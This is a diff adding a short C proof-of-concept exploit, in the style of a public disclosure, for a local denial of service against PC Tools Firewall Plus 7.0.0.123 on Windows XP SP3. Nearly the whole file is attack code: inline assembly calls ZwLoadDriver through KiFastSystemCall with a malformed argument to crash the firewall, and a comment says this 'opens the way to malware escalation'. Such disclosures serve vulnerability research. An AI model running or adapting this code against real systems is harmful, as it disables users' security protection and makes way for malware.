@@ -1,0 +1,29 @@
+/* 
+Exploit Title: PC Tools Firewall Plus Local DoS
+Version: 7.0.0.123
+Author: 0in (Maksymilian Motyl)
+Software Link: www.pctools.com
+Tested on: Windows XP SP3
+Vendor was notified 25.06.2012 - No reply
+*/
+
+// After executing this small code, PC Tools Firewall crashes so it opens the way to malware escalation
+#include "stdafx.h"
+#include <Windows.h>
+ 
+int _tmain(int argc, _TCHAR* argv[])
+{
+	for(int i=0;i<512;i++)
+		printf(".");
+     _asm
+     {
+          push 0xffffff
+          mov eax,61h ;          ZwLoadDriver 
+          mov edx,7FFE0300h ; ntdll.KiFastSystemCall
+          call dword ptr ds:[edx]
+ 
+     }
+ 
+ 
+     return 0;
+}
